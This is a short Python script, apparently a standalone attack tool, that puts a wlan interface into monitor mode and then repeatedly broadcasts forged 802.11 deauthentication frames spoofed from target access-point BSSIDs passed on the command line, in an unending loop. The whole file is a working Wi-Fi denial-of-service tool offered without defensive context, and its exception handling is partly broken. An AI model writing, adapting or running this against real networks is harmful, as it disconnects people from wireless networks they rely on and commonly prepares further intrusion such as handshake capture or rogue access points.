#!/usr/bin/env python

import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import socket
from subprocess import call
from threading import Thread

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
P  = '\033[35m' # purple
BOLD = '\033[1m' # bold
THIN = '\033[1m' # normal
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;93m"
T_YELLOW = "\033[0;93m"
NORMAL = "\033[0;0m"


brdmac = "FF:FF:FF:FF:FF:FF"
aps = []

def monitor_on():
    ifaces = os.listdir('/sys/class/net/')
    status = False
    for iface in ifaces:
        if 'wlan0' in iface:
            print('\n[' +G+ '+' +W+ '] Interface found!\nTurning on monitoring mode...')
            os.system('ifconfig ' + iface + ' down')
            os.system('iwconfig ' + iface + ' mode monitor')
            os.system('ifconfig ' + iface + ' up')
            print('[' +G+ '+' +W+ '] Turned on monitoring mode on: ' + iface)
            status = True
	    global iq
	    iq = iface
            return iface
    if status == False:
        print('[' +R+ '-' +W+'] No interface found. Try it manually.')
        sys.exit(0)


if __name__ == '__main__':
    print("Deauthentication has started.")
    monitor_on()
    channel = sys.argv[1]
    call("sudo iwconfig {iface} channel {ch}".format(iface=iq, ch=channel), shell=True)
    while sys.argv[2:]:
    	try:
		for a in sys.argv[2:]:
	            pkt = RadioTap() / Dot11( addr1 = brdmac, addr2 = a, addr3 = a)/Dot11Deauth()
		    conf.verb = 0
                    sendp(pkt, iface = iq, count = 30, inter = .05)
		    print("[{G}+{N}] {pkt} frames sent to {Y}{bssid}{N}".format(pkt=30, G=GREEN, N=NORMAL, Y=YELLOW, bssid=a))
		    time.sleep(0.5)
        except socket.error or KeyboardInterrupt:
                    print("{R}ERROR: Network-Interface is down.{N}".format(R=RED, N=NORMAL))
                    sys.exit(0)    
    else:
	print("No BSSID detected in the script.")
	try:
		time.sleep(3)
		sys.exit(0)
	except:
		time.sleep(3)
		sys.exit(0)
    
